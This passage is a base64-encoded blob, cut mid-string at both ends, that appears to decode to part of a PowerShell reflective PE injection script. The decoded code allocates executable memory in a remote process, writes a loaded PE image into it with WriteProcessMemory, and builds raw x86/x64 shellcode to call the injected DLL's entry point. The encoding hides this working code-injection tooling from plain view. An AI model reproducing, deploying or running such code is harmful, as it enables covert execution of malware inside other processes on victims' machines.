C1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlBFIGlzIG5vdCBjb21wYXRpYmxlIHdpdGggREVQLCBtaWdodCBjYXVzZSBpc3N1ZXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICROWENvbXBhdGlibGUgPSAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI1ZlcmlmeSB0aGF0IHRoZSBQRSBhbmQgdGhlIGN1cnJlbnQgcHJvY2VzcyBhcmUgdGhlIHNhbWUgYml0cyAoMzJiaXQgb3IgNjRiaXQpCiAgICAgICAgJFByb2Nlc3M2NEJpdCA9ICR0cnVlCiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJJc1dvdzY0UHJvY2VzcyIpCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGxvY2F0ZSBJc1dvdzY0UHJvY2VzcyBmdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgdGFyZ2V0IHByb2Nlc3MgaXMgMzJiaXQgb3IgNjRiaXQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtCb29sXSRXb3c2NFByb2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbUmVmXSRXb3c2NFByb2Nlc3MpCiAgICAgICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBJc1dvdzY0UHJvY2VzcyBmYWlsZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgoJFdvdzY0UHJvY2VzcyAtZXEgJHRydWUpIC1vciAoKCRXb3c2NFByb2Nlc3MgLWVxICRmYWxzZSkgLWFuZCAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCkpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY2VzczY0Qml0ID0gJGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICNQb3dlclNoZWxsIG5lZWRzIHRvIGJlIHNhbWUgYml0IGFzIHRoZSBQRSBiZWluZyBsb2FkZWQgZm9yIEludFB0ciB0byB3b3JrIGNvcnJlY3RseQogICAgICAgICAgICAkUG93ZXJTaGVsbDY0Qml0ID0gJHRydWUKICAgICAgICAgICAgaWYgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLW5lIDgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQb3dlclNoZWxsNjRCaXQgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBvd2VyU2hlbGw2NEJpdCAtbmUgJFByb2Nlc3M2NEJpdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdGhyb3cgIlBvd2VyU2hlbGwgbXVzdCBiZSBzYW1lIGFyY2hpdGVjdHVyZSAoeDg2L3g2NCkgYXMgUEUgYmVpbmcgbG9hZGVkIGFuZCByZW1vdGUgcHJvY2VzcyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2Nlc3M2NEJpdCA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkUHJvY2VzczY0Qml0IC1uZSAkUEVJbmZvLlBFNjRCaXQpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiUEUgcGxhdGZvcm0gZG9lc24ndCBtYXRjaCB0aGUgYXJjaGl0ZWN0dXJlIG9mIHRoZSBwcm9jZXNzIGl0IGlzIGJlaW5nIGxvYWRlZCBpbiAoMzIvNjRiaXQpIgogICAgICAgIH0KICAgICAgICAKCiAgICAgICAgI0FsbG9jYXRlIG1lbW9yeSBhbmQgd3JpdGUgdGhlIFBFIHRvIG1lbW9yeS4gSWYgdGhlIFBFIHN1cHBvcnRzIEFTTFIsIGFsbG9jYXRlIHRvIGEgcmFuZG9tIG1lbW9yeSBhZGRyZXNzCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQWxsb2NhdGluZyBtZW1vcnkgZm9yIHRoZSBQRSBhbmQgd3JpdGUgaXRzIGhlYWRlcnMgdG8gbWVtb3J5IgogICAgICAgIAogICAgICAgICNBU0xSIGNoZWNrCiAgICAgICAgW0ludFB0cl0kTG9hZEFkZHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRQRVN1cHBvcnRzQVNMUiA9IChbSW50XSAkUEVJbmZvLkRsbENoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRSkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFCiAgICAgICAgaWYgKCgtbm90ICRGb3JjZUFTTFIpIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlBFIGZpbGUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgQVNMUiBjb21wYXRpYmxlLiBJZiB0aGUgbG9hZGluZyBmYWlscywgdHJ5IHJlc3RhcnRpbmcgUG93ZXJTaGVsbCBhbmQgdHJ5aW5nIGFnYWluIE9SIHRyeSB1c2luZyB0aGUgLUZvcmNlQVNMUiBmbGFnIChjb3VsZCBjYXVzZSBjcmFzaGVzKSIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgW0ludFB0cl0kTG9hZEFkZHIgPSAkT3JpZ2luYWxJbWFnZUJhc2UKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkRm9yY2VBU0xSIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGZpbGUgZG9lc24ndCBzdXBwb3J0IEFTTFIgYnV0IC1Gb3JjZUFTTFIgaXMgc2V0LiBGb3JjaW5nIEFTTFIgb24gdGhlIFBFIGZpbGUuIFRoaXMgY291bGQgcmVzdWx0IGluIGEgY3Jhc2guIgogICAgICAgIH0KCiAgICAgICAgaWYgKCRGb3JjZUFTTFIgLWFuZCAkUmVtb3RlTG9hZGluZykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3QgdXNlIEZvcmNlQVNMUiB3aGVuIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4iIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtYW5kICgtbm90ICRQRVN1cHBvcnRzQVNMUikpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiUEUgZG9lc24ndCBzdXBwb3J0IEFTTFIuIENhbm5vdCBsb2FkIGEgbm9uLUFTTFIgUEUgaW4gdG8gYSByZW1vdGUgcHJvY2VzcyIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CgogICAgICAgICRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvICAgICAgICAgICAgICAjVGhpcyBpcyB3aGVyZSB0aGUgUEUgaXMgYWxsb2NhdGVkIGluIFBvd2VyU2hlbGwKICAgICAgICAkRWZmZWN0aXZlUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybyAgICAgI1RoaXMgaXMgdGhlIGFkZHJlc3MgdGhlIFBFIHdpbGwgYmUgbG9hZGVkIHRvLiBJZiBpdCBpcyBsb2FkZWQgaW4gUG93ZXJTaGVsbCwgdGhpcyBlcXVhbHMgJFBFSGFuZGxlLiBJZiBpdCBpcyBsb2FkZWQgaW4gYSByZW1vdGUgcHJvY2VzcywgdGhpcyBpcyB0aGUgYWRkcmVzcyBpbiB0aGUgcmVtb3RlIHByb2Nlc3MuCiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICNBbGxvY2F0ZSBzcGFjZSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MsIGFuZCBhbHNvIGFsbG9jYXRlIHNwYWNlIGluIFBvd2VyU2hlbGwuIFRoZSBQRSB3aWxsIGJlIHNldHVwIGluIFBvd2VyU2hlbGwgYW5kIGNvcGllZCB0byB0aGUgcmVtb3RlIHByb2Nlc3Mgd2hlbiBpdCBpcyBzZXR1cAogICAgICAgICAgICAkUEVIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgCiAgICAgICAgICAgICN0b2RvLCBlcnJvciBoYW5kbGluZyBuZWVkcyB0byBkZWxldGUgdGhpcyBtZW1vcnkgaWYgYW4gZXJyb3IgaGFwcGVucyBhbG9uZyB0aGUgd2F5CiAgICAgICAgICAgICRFZmZlY3RpdmVQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICBpZiAoJEVmZmVjdGl2ZVBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzLiBJZiB0aGUgUEUgYmVpbmcgbG9hZGVkIGRvZXNuJ3Qgc3VwcG9ydCBBU0xSLCBpdCBjb3VsZCBiZSB0aGF0IHRoZSByZXF1ZXN0ZWQgYmFzZSBhZGRyZXNzIG9mIHRoZSBQRSBpcyBhbHJlYWR5IGluIHVzZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoJE5YQ29tcGF0aWJsZSAtZXEgJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKCRMb2FkQWRkciwgW1VJbnRQdHJdJFBFSW5mby5TaXplT2ZJbWFnZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRFZmZlY3RpdmVQRUhhbmRsZSA9ICRQRUhhbmRsZQogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRQRUVuZEFkZHJlc3MgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uU2l6ZU9mSW1hZ2UpCiAgICAgICAgaWYgKCRQRUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgeyAKICAgICAgICAgICAgVGhyb3cgIlZpcnR1YWxBbGxvYyBmYWlsZWQgdG8gYWxsb2NhdGUgbWVtb3J5IGZvciBQRS4gSWYgUEUgaXMgbm90IEFTTFIgY29tcGF0aWJsZSwgdHJ5IHJ1bm5pbmcgdGhlIHNjcmlwdCBpbiBhIG5ldyBQb3dlclNoZWxsIHByb2Nlc3MgKHRoZSBuZXcgUG93ZXJTaGVsbCBwcm9jZXNzIHdpbGwgaGF2ZSBhIGRpZmZlcmVudCBtZW1vcnkgbGF5b3V0LCBzbyB0aGUgYWRkcmVzcyB0aGUgUEUgd2FudHMgbWlnaHQgYmUgZnJlZSkuIgogICAgICAgIH0gICAgICAgCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgMCwgJFBFSGFuZGxlLCAkUEVJbmZvLlNpemVPZkhlYWRlcnMpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAKICAgICAgICAjTm93IHRoYXQgdGhlIFBFIGlzIGluIG1lbW9yeSwgZ2V0IG1vcmUgZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQgaXQKICAgICAgICBXcml0ZS1WZXJib3NlICJHZXR0aW5nIGRldGFpbGVkIFBFIGluZm9ybWF0aW9uIGZyb20gdGhlIGhlYWRlcnMgbG9hZGVkIGluIG1lbW9yeSIKICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFbmRBZGRyZXNzIC1WYWx1ZSAkUEVFbmRBZGRyZXNzCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVmZmVjdGl2ZVBFSGFuZGxlIC1WYWx1ZSAkRWZmZWN0aXZlUEVIYW5kbGUKICAgICAgICBXcml0ZS1WZXJib3NlICJTdGFydEFkZHJlc3M6ICQoR2V0LUhleCAkUEVIYW5kbGUpICAgIEVuZEFkZHJlc3M6ICQoR2V0LUhleCAkUEVFbmRBZGRyZXNzKSIKICAgICAgICAKICAgICAgICAKICAgICAgICAjQ29weSBlYWNoIHNlY3Rpb24gZnJvbSB0aGUgUEUgaW4gdG8gbWVtb3J5CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ29weSBQRSBzZWN0aW9ucyBpbiB0byBtZW1vcnkiCiAgICAgICAgQ29weS1TZWN0aW9ucyAtUEVCeXRlcyAkUEVCeXRlcyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwogICAgICAgIAogICAgICAgIAogICAgICAgICNVcGRhdGUgdGhlIG1lbW9yeSBhZGRyZXNzZXMgaGFyZGNvZGVkIGluIHRvIHRoZSBQRSBiYXNlZCBvbiB0aGUgbWVtb3J5IGFkZHJlc3MgdGhlIFBFIHdhcyBleHBlY3RpbmcgdG8gYmUgbG9hZGVkIHRvIHZzIHdoZXJlIGl0IHdhcyBhY3R1YWxseSBsb2FkZWQKICAgICAgICBXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IGFkZHJlc3NlcyBiYXNlZCBvbiB3aGVyZSB0aGUgUEUgd2FzIGFjdHVhbGx5IGxvYWRlZCBpbiBtZW1vcnkiCiAgICAgICAgVXBkYXRlLU1lbW9yeUFkZHJlc3NlcyAtUEVJbmZvICRQRUluZm8gLU9yaWdpbmFsSW1hZ2VCYXNlICRPcmlnaW5hbEltYWdlQmFzZSAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgogICAgICAgIAogICAgICAgICNUaGUgUEUgd2UgYXJlIGluLW1lbW9yeSBsb2FkaW5nIGhhcyBETExzIGl0IG5lZWRzLCBpbXBvcnQgdGhvc2UgRExMcyBmb3IgaXQKICAgICAgICBXcml0ZS1WZXJib3NlICJJbXBvcnQgRExMJ3MgbmVlZGVkIGJ5IHRoZSBQRSB3ZSBhcmUgbG9hZGluZyIKICAgICAgICBpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgSW1wb3J0LURsbEltcG9ydHMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICNVcGRhdGUgdGhlIG1lbW9yeSBwcm90ZWN0aW9uIGZsYWdzIGZvciBhbGwgdGhlIG1lbW9yeSBqdXN0IGFsbG9jYXRlZAogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCROWENvbXBhdGlibGUgLWVxICR0cnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IHByb3RlY3Rpb24gZmxhZ3MiCiAgICAgICAgICAgICAgICBVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBOWCBtZW1vcnksIGtlZXBpbmcgbWVtb3J5IGFzIHJlYWQgd3JpdGUgZXhlY3V0ZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJQRSBiZWluZyBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcywgbm90IGFkanVzdGluZyBtZW1vcnkgcGVybWlzc2lvbnMiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICNJZiByZW1vdGUgbG9hZGluZywgY29weSB0aGUgRExMIGluIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBbVUludDMyXSROdW1CeXRlc1dyaXR0ZW4gPSAwCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSwgJFBFSGFuZGxlLCBbVUludFB0cl0oJFBFSW5mby5TaXplT2ZJbWFnZSksIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI0NhbGwgdGhlIGVudHJ5IHBvaW50LCBpZiB0aGlzIGlzIGEgRExMIHRoZSBlbnRyeXBvaW50IGlzIHRoZSBEbGxNYWluIGZ1bmN0aW9uLCBpZiBpdCBpcyBhbiBFWEUgaXQgaXMgdGhlIE1haW4gZnVuY3Rpb24KICAgICAgICBpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZGxsbWFpbiBzbyB0aGUgRExMIGtub3dzIGl0IGhhcyBiZWVuIGxvYWRlZCIKICAgICAgICAgICAgICAgICREbGxNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKICAgICAgICAgICAgICAgICREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAgICAgICAgICREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAxLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEVmZmVjdGl2ZVBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDY2LCAweDgzLCAweGU0LCAweDAwLCAweDQ4LCAweGI5KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0MSwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHhiOCkKICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGYwLCAweGI5KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1MCwgMHg1MiwgMHg1MSwgMHhiOCkKICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU0NMZW5ndGggPSAkQ2FsbERsbE1haW5TQzEuTGVuZ3RoICsgJENhbGxEbGxNYWluU0MyLkxlbmd0aCArICRDYWxsRGxsTWFpblNDMy5MZW5ndGggKyAoJFB0clNpemUgKiAyKQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQogICAgICAgICAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MxLkxlbmd0aCkKICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRFZmZlY3RpdmVQRUhhbmRsZSwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzIuTGVuZ3RoKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJERsbE1haW5QdHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MzLkxlbmd0aCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGg